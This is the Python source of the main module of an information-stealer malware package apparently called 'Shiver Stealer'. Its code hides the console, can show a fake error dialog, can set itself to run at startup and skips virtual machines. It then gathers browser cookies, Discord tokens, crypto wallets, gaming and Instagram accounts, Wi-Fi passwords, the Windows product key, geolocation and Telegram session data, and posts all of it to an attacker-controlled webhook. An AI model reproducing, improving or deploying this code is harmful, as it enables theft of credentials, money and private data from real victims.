import os
import sys
import json
import time
import threading
import shutil
import zipfile
from . import utils
from .browsers import BrowserStealer
from .discord import DiscordStealer
from .system import SystemInfo
from .wallets import WalletStealer
from .gaming import GamingStealer
from .social import SocialStealer
from .kiwi import KiwiStealer
from .webhook import WebhookFormatter

class Stealer:
    def __init__(self, webhook_url, config=None):
        self.webhook_url = webhook_url
        self.config = config or {}
        self.browser_stealer = BrowserStealer()
        self.discord_stealer = DiscordStealer()
        self.system_info = SystemInfo()
        self.wallet_stealer = WalletStealer()
        self.gaming_stealer = GamingStealer()
        self.social_stealer = SocialStealer()
        self.kiwi_stealer = KiwiStealer()
        self.formatter = WebhookFormatter(webhook_url)
        self.telegram_data = None

    def run(self):
        try:
            utils.hide_console()

            if self.config.get('fake_error', {}).get('enabled', False):
                fe = self.config['fake_error']
                utils.show_fake_error(fe.get('title', 'Error'), fe.get('message', 'An error occurred'), fe.get('icon', 'error'))

            if self.config.get('startup', False):
                utils.add_to_startup()

            if utils.check_anti_vm() and self.config.get('anti_vm', True):
                return

            threads = []
            t = threading.Thread(target=self.gather_system); threads.append(t); t.start()
            t = threading.Thread(target=self.gather_browsers); threads.append(t); t.start()
            t = threading.Thread(target=self.gather_discord); threads.append(t); t.start()
            t = threading.Thread(target=self.gather_gaming); threads.append(t); t.start()
            t = threading.Thread(target=self.gather_wallets); threads.append(t); t.start()
            t = threading.Thread(target=self.gather_kiwi); threads.append(t); t.start()
            t = threading.Thread(target=self.gather_telegram); threads.append(t); t.start()
            for t in threads:
                t.join()

            ip, country, city, isp, org, asn, region, zip_code, lat, lon = utils.get_ip_geo()
            geo_info = (ip, country, city, isp, org, asn, region, zip_code, lat, lon)

            self.gather_social(self.browser_stealer.cookies)

            if self.browser_stealer.cookies:
                self.discord_stealer.steal_from_browser_cookies(self.browser_stealer.cookies)

                for token in self.discord_stealer.tokens:
                    if token not in [t.get('token') for t in self.discord_stealer.token_info]:
                        info = self.discord_stealer.get_token_info(token)
                        if info:
                            self.discord_stealer.token_info.append(info)

            wifi_data = self.system_info.get_wifi_passwords()
            windows_key = utils.get_windows_key()
            software = self.system_info.get_installed_software()

            self.formatter.send_all(
                system_info=self.system_info.info,
                geo_info=geo_info,
                browser_stealer=self.browser_stealer,
                discord_info=self.discord_stealer.token_info,
                roblox_data=self.gaming_stealer.roblox,
                instagram_data=self.social_stealer.instagram,
                steam_data=self.gaming_stealer.steam,
                mc_data=self.gaming_stealer.minecraft,
                wallet_stealer=self.wallet_stealer,
                wifi_data=wifi_data,
                kiwi_stealer=self.kiwi_stealer,
                windows_key=windows_key,
                software_list=software,
                telegram_data=self.telegram_data,
            )
        except Exception as e:
            try:
                import requests
                requests.post(self.webhook_url, json={
                    'content': 'Shiver Stealer Error: ```' + str(e)[:500] + '```'
                }, timeout=10)
            except:
                pass

    def gather_system(self):
        try:
            self.system_info.gather()
        except:
            pass

    def gather_browsers(self):
        try:
            self.browser_stealer.steal_all()
        except:
            pass

    def gather_discord(self):
        try:
            self.discord_stealer.steal_all()
        except:
            pass

    def gather_gaming(self):
        try:
            self.gaming_stealer.steal_all()
        except:
            pass

    def gather_wallets(self):
        try:
            chrome_path = os.path.join(utils.get_localappdata(), 'Google', 'Chrome', 'User Data')
            self.wallet_stealer.steal_all(browser_paths=[chrome_path])
        except:
            pass

    def gather_kiwi(self):
        try:
            self.kiwi_stealer.steal_all()
        except:
            pass

    def gather_telegram(self):
        try:
            for tpath in utils.TELEGRAM_PATHS:
                if os.path.exists(tpath):
                    out = os.path.join(utils.get_temp(), 'shiver_telegram_' + utils.generate_id())
                    try:
                        shutil.copytree(tpath, out)
                        zip_path = out + '.zip'
                        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                            for root, dirs, files in os.walk(out):
                                for file in files:
                                    zf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), out))
                        self.telegram_data = zip_path
                        shutil.rmtree(out, ignore_errors=True)
                    except:
                        pass
                    break
        except:
            pass

    def gather_social(self, cookies_data):
        try:
            if cookies_data:
                self.social_stealer.steal_all(cookies_data)
        except:
            pass
